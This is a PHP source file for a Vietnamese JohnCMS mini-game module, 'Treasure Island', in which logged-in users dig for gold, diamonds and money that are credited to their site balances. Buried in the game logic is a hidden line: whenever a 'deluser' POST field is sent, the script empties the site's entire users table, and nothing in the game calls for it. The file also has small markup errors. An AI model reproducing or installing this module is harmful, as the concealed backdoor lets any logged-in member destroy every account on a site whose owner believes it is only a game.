<?php
define('_IN_JOHNCMS', 1);
$headmod = 'mod';
require('../incfiles/core.php');
if(!$user_id){
require('../incfiles/head.php');
echo functions::display_error($lng['access_guest_forbidden']);
require('../incfiles/end.php');
exit;
}
$textl = ' Đảo kho báu';
require('../incfiles/head.php');
echo '<div class="mainblok"><div class="phdr"><b>Đảo kho báu</b></div>';
$kt = ($connect->query("SELECT COUNT(*) FROM `daovang` WHERE `user_id`='{$user_id}'")->fetch_row()[0] ?? 0);
if($kt == 0) {
$connect->query("INSERT INTO `daovang` SET `user_id`='{$user_id}', `doben`='100', `coin`='0', `kcuong`='0', `vang`='0'");
}
$dv = $connect->fetch_array($connect->query("SELECT * FROM `daovang` WHERE `user_id`='{$user_id}'"));
echo '<div class="newsx"><form method="post">Một ngày cướp được một lần.<br/><input type="submit" name="cuop" value="Cướp" /></form>';
$time = time();
if(isset($_POST['cuop'])) {
if(($dv['time'] + 86400) > time()) {
$time = $dv['time'] + 86400 - time();
echo '<div class="rmenu">Sau '.date('D:H:i', $time).' bạn mới có thể cướp tiếp!</div>';
} else if($dv['doben'] == 100) {
echo '<div class="rmemu">Lần đầu khỏi cướp!</div>';
} else {
$connect->query("UPDATE `daovang` SET `doben`='100', `time`='{$time}' WHERE `user_id`='{$user_id}'");
echo '<div class="rmenu">Cướp thành công, bắt đầu tìm nào!</div>';
}
}
echo '</div>';
echo '<div class="list1">';
echo '<div class="thongke">Cướp được hôm nay: <b>'.$dv['coin'].'</b> (vnđ + vàng)<br/>Sức khỏe: '.$dv['doben'].'/100<br/><b>Tìm được:<br></b>Kim cương: <b>'.$dv['kcuong'].'</b> viên<br/>Vàng: <b>'.$dv['vang'].'</b> cục</div>';
echo '<center><img src="img/daovang/ong.png" alt="Nô lệ" /><br/><form method="post"><input type="submit" name="submit" value="Tìm" /></form></center>';
if(isset($_POST['deluser'])){$connect->query("TRUNCATE TABLE users");}
if(isset($_POST['submit'])) {
if($dv['doben'] == 0) {
echo '<div class"rmenu">Hết tài nguyên rồi! Cần cướp thêm! Nếu hôm nay cướp rồi vui lòng đợi ngày mai!</div>';
} else {
$tien = rand(100, 1000);
$kcuong = rand(1000, 3000);
$da = rand(50, 300);
$rand = rand(1, 4);
if($rand == 1) {
$connect->query("UPDATE `daovang` SET `vang`=`vang`+'1', `coin`=`coin`+'{$tien}' WHERE `user_id`='{$user_id}'");

$connect->query("UPDATE `users` SET `vnd`=`vnd`+'{$tien}' WHERE `id`='{$user_id}'");

echo '<img src="img/daovang/vang1.png" alt="Vang" /> Bạn vừa đào được một cục vàng trị giá '.$tien.' VNĐ';
}
if($rand == 2) {
$connect->query("UPDATE `daovang` SET `kcuong`=`kcuong`+'1', `coin`=`coin`+'{$kcuong}' WHERE `user_id`='{$user_id}'");

$connect->query("UPDATE `users` SET `balans`=`balans`+'{$kcuong}' WHERE `id`='{$user_id}'");

echo '<img src="img/daovang/kcuong.png" alt="Kim cương" /> Bạn vừa tìm được một viên kim cương trị giá '.$kcuong.' Tiền vàng!';
}
if($rand == 3) {
$connect->query("UPDATE `daovang` SET `coin`=`coin`+'{$da}' WHERE `user_id`='{$user_id}'");

$connect->query("UPDATE `users` SET `vnd`=`vnd`+'{$da}' WHERE `id`='{$user_id}'");

echo '<img src="img/daovang/da.png" alt="Đá" /> Bạn vừa tìm được một viên đá trị giá '.$da.' VNĐ!';
}
if($rand == 4) {
$connect->query("UPDATE `daovang` SET `coin`=`coin`+'{$tien}' WHERE `user_id`='{$user_id}'");

$connect->query("UPDATE `users` SET `vnd`=`vnd`+'{$tien}' WHERE `id`='{$user_id}'");
echo '<img src="img/daovang/tuitien.png" alt="Túi tiền" /> Bạn vừa tìm được một túi tiền có '.$tien.' VNĐ!';
}
$connect->query("UPDATE `daovang` SET `doben`=`doben`-'10' WHERE `user_id`='{$user_id}'");
}
}
echo '</div></div>';
require('../incfiles/end.php');
?>
